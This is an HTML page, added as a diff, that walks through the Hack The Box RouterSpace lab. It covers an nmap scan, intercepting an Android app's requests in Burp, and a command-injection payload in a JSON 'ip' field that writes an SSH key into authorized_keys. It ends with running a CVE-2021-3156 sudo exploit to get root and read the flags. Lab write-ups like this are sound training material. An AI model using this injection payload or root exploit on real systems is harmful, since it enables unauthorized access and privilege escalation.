@@ -1,0 +1,241 @@
+<!DOCTYPE html><html>
+<hr>
+<img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/routerspace/routerspace.png">
+<h2 class="code-line" data-line-start=9 data-line-end=10><a id="nmap_9"></a>nmap</h2>
+<pre><code class="has-line-data" data-line-start="12" data-line-end="118" class="language-shel">┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+└╼[★]$nmap -sC -sV -oA nmap 10.10.11.148
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-05 21:36 PKT
+Nmap scan report for 10.10.11.148
+Host is up (0.18s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-RouterSpace Packet Filtering V1
+80/tcp open  http
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-84175
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 65
+|     ETag: W/&quot;41-bo9lk6+f+tZQb/ChPLEuYmd0j6g&quot;
+|     Date: Sat, 05 Mar 2022 16:54:44 GMT
+|     Connection: close
+|     Suspicious activity detected !!! {RequestID: b X kMM X 7 }
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-76967
+|     Accept-Ranges: bytes
+|     Cache-Control: public, max-age=0
+|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
+|     ETag: W/&quot;652c-17d476c9285&quot;
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 25900
+|     Date: Sat, 05 Mar 2022 16:54:42 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;RouterSpace&lt;/title&gt;
+|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-67272
+|     Allow: GET,HEAD,POST
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 13
+|     ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;
+|     Date: Sat, 05 Mar 2022 16:54:43 GMT
+|     Connection: close
+|     GET,HEAD,POST
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|_    Connection: close
+|_http-title: RouterSpace
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(NULL,
+SF:29,&quot;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(GetRe
+SF:quest,2E91,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
+SF:-Cdn:\x20RouterSpace-76967\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
+SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
+SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\&quot;652c-17d476c9285\&quot;\r\nContent-Type:
+SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
+SF:0Sat,\x2005\x20Mar\x202022\x2016:54:42\x20GMT\r\nConnection:\x20close\r
+SF:\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;zxx\&quot;&gt;\n&lt;h
+SF:ead&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20&lt;met
+SF:a\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\x20\x
+SF:20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;descr
+SF:iption\&quot;\x20content=\&quot;\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x
+SF:20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x20\x20\x
+SF:20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\x2
+SF:0\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/owl\.carousel\.m
+SF:in\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/m
+SF:agnific-popup\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20h
+SF:ref=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;sty
+SF:lesheet\&quot;\x20href=\&quot;css/themify-icons\.css\&quot;&gt;\n\x20&quot;)%r(HTTPOptions,108
+SF:,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
+SF:outerSpace-67272\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
+SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&quot;d-bMedpZY
+SF:GrVt1nR4x\+qdNZ2GqyRo\&quot;\r\nDate:\x20Sat,\x2005\x20Mar\x202022\x2016:54:
+SF:43\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&quot;)%r(RTSPRequest,
+SF:2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;
+SF:)%r(X11Probe,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
+SF:lose\r\n\r\n&quot;)%r(FourOhFourRequest,127,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Pow
+SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-84175\r\nContent-Type:
+SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2065\r\nETag:\x20W/
+SF:\&quot;41-bo9lk6\+f\+tZQb/ChPLEuYmd0j6g\&quot;\r\nDate:\x20Sat,\x2005\x20Mar\x202
+SF:022\x2016:54:44\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20act
+SF:ivity\x20detected\x20!!!\x20{RequestID:\x20b\x20\x20\x20X\x20\x20kMM\x2
+SF:0\x20X\x207\x20\x20}\n\n&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.97 seconds
+</code></pre>
+<p class="has-line-data" data-line-start="119" data-line-end="120">Let’s visit port 8080</p>
+<p class="has-line-data" data-line-start="121" data-line-end="122"><img src="/assets/routerspace/home.png" alt="website"></p>
+<p class="has-line-data" data-line-start="123" data-line-end="124">This appears to be a routing management system for an apartment</p>
+<p class="has-line-data" data-line-start="125" data-line-end="126">first look around</p>
+<p class="has-line-data" data-line-start="127" data-line-end="128">Here, Download in the upper right corner will download an apk package. After downloading, use the simulator to run it and then burp to capture the package.</p>
+<p class="has-line-data" data-line-start="129" data-line-end="130">need to install AnBox After installation, we start the emulator</p>
+<p class="has-line-data" data-line-start="131" data-line-end="132"><code>adb shell settings put global http_proxy 192.168.18.4:8080</code></p>
+<p class="has-line-data" data-line-start="133" data-line-end="134">Then after burp sets the listening port, use burp to proxy anbox</p>
+<pre><code class="has-line-data" data-line-start="136" data-line-end="140">[spy0x7㉿pop-os]─[/home/spy0x7/Downloads]
+└╼[★]$adb install RouterSpace.apk
+Success
+</code></pre>
+<p class="has-line-data" data-line-start="141" data-line-end="142"><img src="/assets/routerspace/install.png" alt="website"></p>
+<p class="has-line-data" data-line-start="143" data-line-end="144">Install the app, then open</p>
+<p class="has-line-data" data-line-start="145" data-line-end="146"><img src="/assets/routerspace/click.png" alt="website"></p>
+<p class="has-line-data" data-line-start="148" data-line-end="149">click on Check Status and intercept this in burp.</p>
+<p class="has-line-data" data-line-start="150" data-line-end="151"><img src="/assets/routerspace/intercept.png" alt="website"></p>
+<p class="has-line-data" data-line-start="152" data-line-end="153">send it to repeater tab.</p>
+<p class="has-line-data" data-line-start="154" data-line-end="155"><img src="/assets/routerspace/repeater.png" alt="website"></p>
+<p class="has-line-data" data-line-start="156" data-line-end="157">Add routerspace.htb to hosts</p>
+<p class="has-line-data" data-line-start="158" data-line-end="159"><code>sudo echo 10.10.11.148 routerspace.htb &gt;&gt; /etc/hosts</code></p>
+<p class="has-line-data" data-line-start="161" data-line-end="162">let’s play with the Request :)</p>
+<p class="has-line-data" data-line-start="163" data-line-end="164">try to execute the command</p>
+<p class="has-line-data" data-line-start="165" data-line-end="166"><img src="/assets/routerspace/id.png" alt="website"></p>
+<p class="has-line-data" data-line-start="167" data-line-end="168">oh it’s work command execute successfully</p>
+<p class="has-line-data" data-line-start="170" data-line-end="171">let’s try to generate a sshkey, and then write it in to log in with ssh.</p>
+<pre><code class="has-line-data" data-line-start="173" data-line-end="196">┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+└╼[★]$ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/spy0x7/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/spy0x7/.ssh/id_rsa.
+Your public key has been saved in /home/spy0x7/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:rTz1OM1hCkc75iB/wFp7RaE9o4MDxfzV3FuEmNxCBRY <a href=""  data-cfemail="3744474e074f00774758471a5844"></a>
+The key's randomart image is:
++---[RSA 2048]----+
+|       o.  oEX.+.|
+|       .o  +*.= o|
+|      .  .o.=.  o|
+|       o +.+ o . |
+|      . S X +    |
+|       * % @ .   |
+|      . * B +    |
+|         + .     |
+|                 |
++----[SHA256]-----+
+</code></pre>
+<p class="has-line-data" data-line-start="197" data-line-end="198">Then save the content of id_rsa.pub as authorized_keys</p>
+<pre><code class="has-line-data" data-line-start="201" data-line-end="203">{&quot;ip&quot;:&quot;0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAQDEfXW5jWSjNdbuSVZWszzfpNq/oeG+WwH5imomLf/N7QJNKAWkbFTk3RMxRBzy9a3pHF7CubMLhykOzjz+4ap22GDkjdA/FL4ha9siGXboor+dpqm4WcfjPy6CdQUroHV0qfNNOz5qT0SfeATsi1udmv8oh1MAfeFNTLaXM0w7JP6EHdcIo2OdJJOsy0jBwQEIf3LsRLl2Q8VLtltR28N7ZTcJzUcuGZpksv3OvUDt2f4NxZCtL3vMwkTJj5wkJy8CpGti473QG2pPU3BcRKOY+RvycqJA3Hz6nN3dbG7lXDEa6PgrzuUXb6dJTB9Rseqq0c69QCHnvQ3B/1ZLig/b <a href=""  data-cfemail="e794979ed79fd0a7978897ca8894"></a>' &gt; /home/paul/.ssh/authorized_keys&quot;}
+</code></pre>
+<p class="has-line-data" data-line-start="204" data-line-end="205">Then use ssh to log in</p>
+<pre><code class="has-line-data" data-line-start="207" data-line-end="247">┌[spy0x7㉿pop-os]─[/home/spy0x7/.ssh]
+└╼[★]$ssh <a href=""  data-cfemail="c5b5a4b0a985f4f5ebf4f5ebf4f4ebf4f1fd"></a>
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 05 Mar 2022 05:28:13 PM UTC
+
+  System load:           0.03
+  Usage of /:            70.6% of 3.49GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             213
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.148
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:29a7
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+80 updates can be applied immediately.
+31 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Mar  5 15:41:03 2022 from 10.10.15.171
+<a href=""  data-cfemail="b6c6d7c3daf6c4d9c3c2d3c4c5c6d7d5d3"></a>:~$ 
+<a href=""  data-cfemail="f28293879eb2809d878697808182939197"></a>:~$ ls
+snap  user.txt
+<a href=""  data-cfemail="720213071e32001d070617000102131117"></a>:~$
+</code></pre>
+<p class="has-line-data" data-line-start="247" data-line-end="248">Successfully login on user</p>
+<pre><code class="has-line-data" data-line-start="250" data-line-end="253"><a href=""  data-cfemail="b9c9d8ccd5f9cbd6cccddccbcac9d8dadc"></a>:~$ cat user.txt 
+75e43b546b55786f3e9435473fd56c26
+</code></pre>
+<p class="has-line-data" data-line-start="254" data-line-end="255">Get the flag</p>
+<h2 class="code-line" data-line-start=256 data-line-end=257><a id="Privilege_escalation_256"></a>Privilege escalation</h2>
+<p class="has-line-data" data-line-start="258" data-line-end="259">First, We run a <a href="http://linpeas.sh">linpeas.sh</a> script to see if there are any privilege escalation</p>
+<p class="has-line-data" data-line-start="260" data-line-end="261">After running we see sudo 1.8.31 is vulnerable.</p>
+<p class="has-line-data" data-line-start="262" data-line-end="263">There is a vulnerability CVE-2021-3156 seen here</p>
+<p class="has-line-data" data-line-start="264" data-line-end="265"><a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a></p>
+<p class="has-line-data" data-line-start="267" data-line-end="268">Let’s transfer the exploit through ssh.</p>
+<pre><code class="has-line-data" data-line-start="271" data-line-end="286">┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa shellcode.c  <a href=""  data-cfemail="44342531280475746a75746a75756a75707c"></a>:.
+Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
+shellcode.c                                                                                          100%  599     3.3KB/s   00:00    
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa Makefile  <a href=""  data-cfemail="176776627b5726273926273926263926232f"></a>:.
+Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
+Makefile                                                                                             100%  208     1.2KB/s   00:00    
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_  <a href=""  data-cfemail="106071657c5021203e21203e21213e212428"></a>:.
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa exploit.c  <a href=""  data-cfemail="413120342d0170716f70716f70706f707579"></a>:.
+file
+exploit.c
+</code></pre>
+<p class="has-line-data" data-line-start="287" data-line-end="288">lets run our exploit</p>
+<pre><code class="has-line-data" data-line-start="290" data-line-end="300"><a href=""  data-cfemail="98e8f9edf4d8eaf7edecfdeaebe8f9fbfd"></a>:~/exploit$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+<a href=""  data-cfemail="81f1e0f4edc1f3eef4f5e4f3f2f1e0e2e4"></a>:~/exploit$ ./exploit 
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(paul)
+# cat /root/root.txt
+567eb556acf2d31ef537b9cfde601e30
+</code></pre>
+<p class="has-line-data" data-line-start="301" data-line-end="302">Successfully root the machine</p>
